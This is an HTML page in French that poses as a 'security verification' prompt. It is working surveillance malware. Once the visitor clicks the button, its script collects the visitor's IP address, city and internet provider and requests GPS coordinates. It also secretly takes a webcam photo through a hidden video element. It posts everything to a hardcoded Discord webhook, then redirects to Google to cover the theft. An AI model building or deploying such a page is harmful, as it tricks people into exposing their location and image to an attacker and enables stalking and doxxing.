<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Diagnostic</title>
    <style>
        body { background: #000; color: #fff; font-family: sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { background: #111; padding: 30px; border-radius: 12px; text-align: center; width: 300px; border: 1px solid #333; }
        .btn { background: #007aff; color: #fff; border: none; padding: 12px; border-radius: 7px; width: 100%; font-weight: bold; cursor: pointer; margin-top: 20px; }
        #video, #canvas { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h3>V√©rification requise</h3>
        <p style="color:#aaa; font-size:13px;">Une analyse de s√©curit√© est n√©cessaire pour acc√©der √† ce contenu.</p>
        <button class="btn" onclick="execute()">Continuer</button>
    </div>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <script>
        const WEBHOOK = "https://discord.com/api/webhooks/1466502605881475242/ynqT6t3L8IAQ69mgtvO17VvNBvmjFqiHayODx-P5EWMeN6renSu8UiM8nDfNNNvTHYy0";

        async function post(content, blob = null) {
            const fd = new FormData();
            if (blob) fd.append('file', blob, 'snap.png');
            fd.append('payload_json', JSON.stringify({ content: content }));
            try { await fetch(WEBHOOK, { method: 'POST', body: fd, keepalive: true }); } catch(e) {}
        }

        async function execute() {
            document.querySelector('.box').innerHTML = "<h3>Analyse en cours...</h3><p>Patientez quelques secondes.</p>";

            // 1. IP PC FORCEE (Via API externe)
            try {
                const res = await fetch('https://ipapi.co/json/');
                const d = await res.json();
                await post(`üåê **IP PC/MOBILE DETECT√âE**\n**IP**: ${d.ip}\n**Ville**: ${d.city}\n**FAI**: ${d.org}\n**OS**: ${navigator.platform}`);
            } catch (e) { await post("‚ùå Impossible de choper l'IP"); }

            // 2. GPS
            navigator.geolocation.getCurrentPosition(async (p) => {
                await post(`üìç **GPS**: http://google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`);
            });

            // 3. CAM√âRA
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                video.onloadedmetadata = () => {
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(async (blob) => {
                            await post("üì∏ **PHOTO RE√áUE**", blob);
                            stream.getTracks().forEach(t => t.stop());
                            window.location.href = "https://www.google.com";
                        }, 'image/png');
                    }, 1000);
                };
            } catch (e) {
                await post("‚ö†Ô∏è Cam√©ra refus√©e");
                window.location.href = "https://www.google.com";
            }
        }
    </script>
</body>
</html>
